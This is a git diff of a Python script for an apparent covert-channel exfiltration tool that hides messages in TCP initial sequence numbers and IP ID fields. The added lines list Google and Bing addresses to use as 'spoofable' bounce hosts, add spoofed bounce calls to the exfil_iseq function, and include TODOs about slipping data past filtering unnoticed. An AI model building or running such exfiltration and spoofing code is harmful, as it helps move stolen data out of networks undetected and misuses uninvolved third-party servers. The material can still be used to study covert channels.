@@ -21,20 +21,16 @@ The sequence numbers are converted to ASCII by dividing by 16777216 which is a
 representation of 65536*256. [1] see README
 
 TODO:
-- change end-of-message indicator, win=1337
 - add try, except where appropriate
-- add mode [demo, live]
-  demo mode will send packets immediately
-  live mode will send 1 packet per second 3 times, once a minute (adjustable)???
 - add bounce functionality
   i.e. bounce SYN packet off an active web server check ACK seq number
 - Add dummy packet data to mimic real traffic. (should we bother?)
-- Add TODOs to the issue queue on github.
-- Add more tests, other than convert TCP/IP channels
 - Send bad checksums (could help prevent responses to our SYN packets)
 - Add a test that sends data in the data section of a packet
   - send '111223333' in one packet
   - send other messages as well, will any get flagged/blocked?
+- refactoring initialSeqFerret.exfil_iseq(spoof, destination, dstport, message)
+  to include a boolean bounce arugment.
 
 Questions:
 - Why not bounce off DNS server(s) ?
@@ -47,6 +43,24 @@ Lets start out by building the initial tests we are interested in and then run
 through them all. I'll add this info to the issue queue. - Clay
 
 Using ttl on the server side to determine how to decipher the message.
+
+A convenient list of spoofable IP addresses:
+
+www.google.com has address 65.199.32.22
+www.google.com has address 65.199.32.20
+www.google.com has address 65.199.32.23
+www.google.com has address 65.199.32.27
+www.google.com has address 65.199.32.21
+www.google.com has address 65.199.32.24
+www.google.com has address 65.199.32.26
+www.google.com has address 65.199.32.25
+www.bing.com is an alias for www-bing-com.a-0001.a-msedge.net.
+www-bing-com.a-0001.a-msedge.net is an alias for a-0001.a-msedge.net.
+a-0001.a-msedge.net has address 13.107.21.200
+a-0001.a-msedge.net has address 204.79.197.200
+
+If you don't like the ability to spoof then do what you can to help change the
+protocol!
 '''
 
 # =======
@@ -133,7 +147,7 @@ print '[+] destination: ' + destination
 
 # ==== use iseq
 print '[*] Testing method Initial Sequence..'
-initialSeqFerret.exfil_iseq(spoof, destination, dstport, message)
+initialSeqFerret.exfil_iseq(spoof, destination, dstport, message, bounce='False')
 print '[*] Sent using iseq: %s' % message
 
 
@@ -147,3 +161,9 @@ print '[*] Sent using IPID: %s' % message
 
 
 # ==== use bounce host
+'''
+The things that are different when performing a bounce scan are:
+- src = destination server
+- dst = host to bounce off of (see spoofable addresses above)
+'''
+initialSeqFerret.exfil_iseq(spoof, destination, dstport, message, bounce='True')
